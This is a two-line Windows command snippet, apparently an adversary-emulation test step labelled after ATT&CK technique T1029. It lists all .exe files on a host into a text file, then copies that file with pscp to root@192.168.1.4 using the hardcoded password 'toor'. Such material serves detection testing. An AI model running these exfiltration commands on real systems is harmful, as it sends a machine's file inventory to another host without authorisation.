cmd /c dir /s /b *.exe > T1029A.txt
pscp -pw toor T1029A.txt root@192.168.1.4:/root/